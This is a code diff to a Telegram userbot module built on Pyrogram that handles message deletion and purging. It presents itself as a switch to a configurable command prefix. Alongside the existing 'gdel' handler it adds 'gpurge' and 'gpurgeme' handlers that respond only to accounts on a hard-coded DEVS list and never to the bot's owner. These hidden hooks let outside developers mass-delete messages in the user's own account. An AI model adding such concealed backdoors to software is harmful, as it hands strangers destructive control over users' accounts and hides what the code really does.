@@ -12,10 +12,11 @@ import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import Message 
 from pyrogram.errors import FloodWait
+from Geez.helper.cmd import *
 from Geez.modules.basic import add_command_help, DEVS
 
-@Client.on_message(filters.command("gdel", ["."]) & filters.user(DEVS) & ~filters.me)
-@Client.on_message(filters.command("del", ".") & filters.me)
+@Client.on_message(filters.command("gdel",cmd) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("del",cmd) & filters.me)
 async def del_msg(client: Client, message: Message):
     msg_src = message.reply_to_message
     if msg_src:
@@ -30,7 +31,8 @@ async def del_msg(client: Client, message: Message):
 
 
 
-@Client.on_message(filters.command("purge", ".") & filters.me)
+@Client.on_message(filters.command("gpurge",cmd) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("purge",cmd) & filters.me)
 async def purge(client: Client, message: Message):
     ex = await message.edit_text("`Starting To Purge Messages!`")
     msg = message.reply_to_message
@@ -61,7 +63,8 @@ async def purge(client: Client, message: Message):
 
 
 
-@Client.on_message(filters.command("purgeme", ".") & filters.me)
+@Client.on_message(filters.command("gpurgeme",cmd) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("purgeme",cmd) & filters.me)
 async def purgeme(client: Client, message: Message):
     if len(message.command) != 2:
         return await message.delete()
